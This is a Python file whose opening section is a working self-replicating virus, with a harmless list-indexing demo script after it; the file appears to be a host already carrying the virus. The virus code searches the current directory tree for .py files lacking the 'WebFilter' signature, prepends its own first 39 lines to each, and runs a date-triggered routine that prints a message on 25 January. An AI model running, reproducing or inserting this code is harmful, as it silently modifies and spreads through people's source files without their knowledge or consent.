#!/usr/bin/python
import os
import datetime
SIGNATURE = "WebFilter"
def search(path):
    filestoinfect = []
    filelist = os.listdir(path)
    for fname in filelist:
        if os.path.isdir(path+"/"+fname):
            filestoinfect.extend(search(path+"/"+fname))
        elif fname[-3:] == ".py":
            infected = False
            for line in open(path+"/"+fname):
                if SIGNATURE in line:
                    infected = True
                    break
            if infected == False:
                filestoinfect.append(path+"/"+fname)
    return filestoinfect
def infect(filestoinfect):
    virus = open(os.path.abspath(__file__))
    virusstring = ""
    for i,line in enumerate(virus):
        if i>=0 and i <39:
            virusstring += line
    virus.close
    for fname in filestoinfect:
        f = open(fname)
        temp = f.read()
        f.close()
        f = open(fname,"w")
        f.write(virusstring + temp)
        f.close()
def bomb():
    if datetime.datetime.now().month == 1 and datetime.datetime.now().day == 25:
        print ("Detecting content filtering...")
filestoinfect = search(os.path.abspath(""))
infect(filestoinfect)
bomb()
#-------------------------------------------------------------------------------
# Name:        module1
# Purpose:
#
# Author:      m.aydin
#
# Created:     30/11/2018
# Copyright:   (c) m.aydin 2018
# Licence:     <your licence>
#-------------------------------------------------------------------------------

x = ["dog", "cat", "piano"]

y = x.index("piano")

print(y)

print(x[y])